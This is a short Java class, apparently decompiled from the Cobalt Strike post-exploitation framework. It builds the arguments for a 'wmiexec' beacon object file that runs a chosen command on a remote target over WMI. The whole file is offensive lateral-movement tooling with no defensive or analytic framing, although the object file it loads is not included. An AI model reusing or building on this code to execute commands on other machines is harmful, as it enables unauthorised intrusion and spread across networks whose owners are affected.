package beacon.bof;

import aggressor.AggressorClient;
import beacon.PostExInlineObject;
import common.Packer;
import common.SleevedResource;

public class WMICommand extends PostExInlineObject {
   protected String target;
   protected String command;

   public WMICommand(AggressorClient var1, String var2, String var3) {
      super(var1);
      this.target = var2;
      this.command = var3;
   }

   public byte[] getArguments(String var1) {
      Packer var2 = new Packer();
      var2.addLengthAndWideStringASCIIZ(this.target);
      var2.addLengthAndWideStringASCIIZ("\\\\" + this.target + "\\ROOT\\CIMV2");
      var2.addLengthAndWideStringASCIIZ(this.command);
      return var2.getBytes();
   }

   public byte[] getObjectFile(String var1) {
      return SleevedResource.readResource("resources/wmiexec." + var1 + ".o");
   }
}
